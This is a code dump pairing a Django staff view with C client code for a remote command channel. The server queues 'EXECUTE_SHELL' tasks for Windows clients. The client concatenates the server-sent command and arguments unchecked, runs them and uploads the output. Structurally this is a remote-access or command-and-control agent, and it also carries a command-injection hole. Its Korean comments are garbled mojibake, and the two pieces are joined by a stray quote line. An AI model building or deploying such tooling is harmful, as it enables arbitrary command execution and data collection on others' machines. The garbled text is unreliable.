from django.contrib.admin.views.decorators import staff_member_required




# íŒŒì¼ í•­ëª©ì„ ë‹´ì„ êµ¬ì¡°ì²´
class FileItem:
    def __init__(self, name, is_dir, size=None):
        self.name = name
        self.is_dir = is_dir
        self.size = size

# íŒŒì¼ ê´€ë¦¬ì ë·° (í•µì‹¬ ê¸°ëŠ¥)
@staff_member_required
def file_manager_view(request, client_id, requested_path=''): 
    client = get_object_or_404(Client, client_id=client_id)
    
    # URLì—ì„œ ë°›ì€ ê²½ë¡œ êµ¬ë¶„ì '::'ë¥¼ ì‹¤ì œ ê²½ë¡œ êµ¬ë¶„ì '/'ë¡œ ë³€í™˜
    current_path = requested_path.replace('::', '/')

    if not current_path:
        current_path = "C:\\" 

    # --- 1. ì´ì „ Task ê²°ê³¼ í™•ì¸ ë° íŒŒì‹± ---
    task_id_to_check = request.GET.get('task_id')
    last_task = None
    
    # ë¨¼ì € ìš”ì²­ëœ task_idê°€ ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
    if task_id_to_check:
        try:
            last_task = CommandTask.objects.get(id=task_id_to_check, client=client)
        except CommandTask.DoesNotExist:
            pass
    
    # task_idê°€ ì—†ê±°ë‚˜ í•´ë‹¹ taskê°€ ì—†ë‹¤ë©´, ê°€ì¥ ìµœê·¼ì˜ EXECUTE_SHELL taskë¥¼ ì°¾ìŠµë‹ˆë‹¤.
    if not last_task:
        last_task = CommandTask.objects.filter(
            client=client,
            command_name='EXECUTE_SHELL'
        ).order_by('-created_at').first()
    
    file_list = []

    if last_task and last_task.status == 'COMPLETED' and last_task.result_content:
        try:
            # ğŸš¨ í˜„ì¬ íŒŒì‹± ë¡œì§ì€ 'dir' ëª…ë ¹ì˜ ìƒì„¸ ì¶œë ¥(Header, Time, <DIR>, Size í¬í•¨)ì„ ì „ì œë¡œ í•©ë‹ˆë‹¤.
            # ğŸš¨ í´ë¼ì´ì–¸íŠ¸ê°€ ë³´ë‚¸ ì‹¤ì œ ê²°ê³¼ í¬ë§·ì— ë§ì¶° íŒŒì‹± ë¡œì§ì„ ìˆ˜ì •í•´ì•¼ í•©ë‹ˆë‹¤.
            lines = last_task.result_content.split('\n')
            
            # Add '..' if not at the root
            is_root = (current_path.upper().rstrip('\\/') == "C:")
            if not is_root and current_path != "/":
                file_list.append(FileItem('..', is_dir=True))

            for line in lines:
                line = line.strip()
                if not line or line in ['.', '..']:
                    continue
                
                # ë§¤ìš° ë‹¨ìˆœí™”ëœ íŒŒì‹± ë¡œì§ (ì‹¤ì œ ìƒì„¸ dir ì¶œë ¥ì—ì„œëŠ” ë™ì‘í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŒ)
                name = os.path.basename(line.rstrip('\\/'))
                is_dir = not os.path.splitext(name)[1] or line.endswith('\\') or line.endswith('/')
                
                file_list.append(FileItem(line, is_dir))

        except Exception as e:
            print(f"[ERROR] Error parsing task result for Task {last_task.id}: {e}")
            pass

    # --- 2. ìƒˆ Task ìƒì„± ìš”ì²­ (ì¤‘ë³µ ë°©ì§€ ë¡œì§ ì ìš©) ---
    path_for_command = current_path.rstrip('\\/') + os.sep
    
    # ğŸŒŸğŸŒŸğŸŒŸ í•µì‹¬ ìˆ˜ì •: í´ë¼ì´ì–¸íŠ¸ê°€ ê¸°ëŒ€í•˜ëŠ” JSON ê°ì²´ í˜•ì‹ìœ¼ë¡œ payload êµ¬ì„± ğŸŒŸğŸŒŸğŸŒŸ
    payload_dict = {
        "command": "dir",
        "arguments": [f"\"{path_for_command}\""], # ê²½ë¡œì— ë”°ì˜´í‘œ í¬í•¨
        "timeout_seconds": 60
    }
    command_payload = json.dumps(payload_dict) # CommandTask.payload í•„ë“œì— ì €ì¥í•  ë¬¸ìì—´
    
    new_task = None
    
    # ì¤‘ë³µ ë°©ì§€ ë¡œì§: PENDING ìƒíƒœì´ë©° ëª…ë ¹ ë‚´ìš©ì´ ì •í™•íˆ ì¼ì¹˜í•˜ëŠ” ê¸°ì¡´ Task ì¬ì‚¬ìš©
    if last_task and last_task.status == 'PENDING' and last_task.payload == command_payload:
        new_task = last_task
        print(f"[INFO] Reusing pending Task ID {new_task.id} for path {current_path}.")
    else:
        # PENDING ìƒíƒœê°€ ì•„ë‹ˆê±°ë‚˜ ë‹¤ë¥¸ ëª…ë ¹ì´ë¼ë©´ ìƒˆë¡œìš´ Taskë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
        new_task = CommandTask.objects.create(
            client=client,
            command_name='EXECUTE_SHELL',
            payload=command_payload, # JSON ë¬¸ìì—´ ì €ì¥
            status='PENDING'
        )
        print(f"[INFO] Created new Task ID {new_task.id} for path {current_path}.")
    
    context = {
        'client': client,
        'current_path': current_path,
        'display_path': current_path.replace('//', '/'), 
        'file_list': file_list,
        'new_task_id': new_task.id if new_task else None,
        'last_task': last_task,
        'title': f'í´ë¼ì´ì–¸íŠ¸ íŒŒì¼ ê´€ë¦¬ì: {client_id}',
        'app_label': 'tasks',
        'command_name': 'EXECUTE_SHELL'
    }

    return render(request, 'tasks/file_manager.html', context)
'''''''''''''





void execute_shell_command(int task_id, cJSON* payload_item) {
    cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload_item, "command");
    cJSON* args_item = cJSON_GetObjectItemCaseSensitive(payload_item, "arguments");

    if (cJSON_IsString(cmd_item) && cJSON_IsArray(args_item)) {
        const char* base_command = cmd_item->valuestring;
        char full_command[1024];

        // --- ëª…ë ¹ êµ¬ì„± ë¡œì§ ---
        memset(full_command, 0, sizeof(full_command));
        strncpy(full_command, base_command, sizeof(full_command) - 1);
        full_command[sizeof(full_command) - 1] = '\0';

        cJSON* arg = NULL;
        int remaining_space = sizeof(full_command) - strlen(full_command);

        cJSON_ArrayForEach(arg, args_item) {
            if (cJSON_IsString(arg) && remaining_space > 0) {
                if (remaining_space > 1) {
                    strcat(full_command, " ");
                    remaining_space--;
                }
                strncat(full_command, arg->valuestring, remaining_space);
                remaining_space = sizeof(full_command) - strlen(full_command);
            }
        }
        // --- ëª…ë ¹ êµ¬ì„± ë¡œì§ ë ---

        printf("\n[EXECUTE_SHELL] ëª…ë ¹ ì‹¤í–‰: %s\n", full_command);

        int exit_code = 0;
        // 1. ëª…ë ¹ ì‹¤í–‰ ë° í‘œì¤€ ì¶œë ¥(ANSI)ì„ ë©”ëª¨ë¦¬ë¡œ ìº¡ì²˜
        char* output = execute_and_capture(full_command, &exit_code);
        // 2. ANSI ì¶œë ¥ì„ UTF-8ë¡œ ë³€í™˜ (ì„œë²„ì—ì„œ ì•ˆì „í•˜ê²Œ í‘œì‹œí•˜ê¸° ìœ„í•¨)
        char* utf8_output = convert_to_utf8(output);

        // 3. íŒŒì¼ ì €ì¥ ë° ì½ê¸° ë‹¨ê³„ë¥¼ ê±´ë„ˆë›°ê³ , ë©”ëª¨ë¦¬ ë¬¸ìì—´ì„ ë°”ë¡œ ë³´ê³ 
        const char* report_status = (exit_code == 0) ? "COMPLETED" : "FAILED";
        // ì„œë²„ UIì—ì„œ ì¸ì‹í•  ê°€ìƒì˜ íŒŒì¼ëª… (ì‹¤ì œ íŒŒì¼ì€ ìƒì„±ë˜ì§€ ì•ŠìŒ)
        const char* ui_filename = "stdout_report.txt";

        printf("[INFO] ëª…ë ¹ ì‹¤í–‰ ê²°ê³¼(UTF-8)ë¥¼ íŒŒì¼ ì €ì¥ ì—†ì´ ë°”ë¡œ ì„œë²„ì— ë³´ê³ í•©ë‹ˆë‹¤.\n");

        // 4. ì„œë²„ì— ë³´ê³  (ì§ì ‘ ë©”ëª¨ë¦¬ ë²„í¼ ì „ë‹¬)
        report_file_to_server(task_id, report_status, ui_filename, utf8_output, exit_code);

        if (utf8_output) free(utf8_output);
        if (output) free(output);
    }
    else {
        printf("[ERROR] EXECUTE_SHELL: 'command' ë˜ëŠ” 'arguments'ê°€ ëˆ„ë½ë˜ì—ˆìŠµë‹ˆë‹¤.\n");
        report_file_to_server(task_id, "FAILED", "error_log.txt", "Missing command or arguments.", 1);
    }
}




// íŒŒì¼ ë‚´ìš©ì„ ì½ì§€ ì•Šê³ , ì¸ìˆ˜ë¡œ ì „ë‹¬ë°›ì€ raw_content(ë©”ëª¨ë¦¬ ë¬¸ìì—´)ë¥¼ ë°”ë¡œ JSONì— í¬í•¨í•˜ì—¬ ì „ì†¡í•©ë‹ˆë‹¤.
void report_file_to_server(int task_id, const char* status, const char* filename_for_ui, const char* raw_content, int exit_code) {
    cJSON* report_json = cJSON_CreateObject();

    cJSON_AddNumberToObject(report_json, "command_id", task_id);
    cJSON_AddStringToObject(report_json, "status", status);
    // ì´ íŒŒì¼ëª…ì€ ì‹¤ì œ íŒŒì¼ì´ ì•„ë‹Œ, ì„œë²„ UIì—ì„œ ì´ ë³´ê³ ì„œë¥¼ êµ¬ë¶„í•˜ëŠ” ì´ë¦„ì…ë‹ˆë‹¤.
    cJSON_AddStringToObject(report_json, "filename", filename_for_ui);

    // **í•µì‹¬ ë³€ê²½**: raw_content(ëª…ë ¹ ì‹¤í–‰ ê²°ê³¼)ë¥¼ file_content í•„ë“œì— ì§ì ‘ í¬í•¨
    cJSON_AddStringToObject(report_json, "file_content", raw_content ? raw_content : "No content captured.");
    cJSON_AddNumberToObject(report_json, "exit_code", exit_code);

    char* json_payload = cJSON_PrintUnformatted(report_json);

    if (json_payload) {
        printf("\n[REPORT] ì„œë²„ì— ë©”ëª¨ë¦¬ ë¬¸ìì—´ JSON ë³´ê³ : /api/upload/receive/\n");

        char* response = http_request("POST", "/api/upload/receive/", json_payload, strlen(json_payload));

        if (response != NULL) {
            printf("[INFO] ë³´ê³  ì‘ë‹µ ìˆ˜ì‹ .\n");
            free(response);
        }
        else {
            fprintf(stderr, "[ERROR] ë³´ê³ ì„œ ì „ì†¡ ì‹¤íŒ¨.\n");
        }

        free(json_payload);
    }
    else {
        fprintf(stderr, "[ERROR] ë³´ê³  JSON ìƒì„± ì‹¤íŒ¨.\n");
    }

    cJSON_Delete(report_json);
}










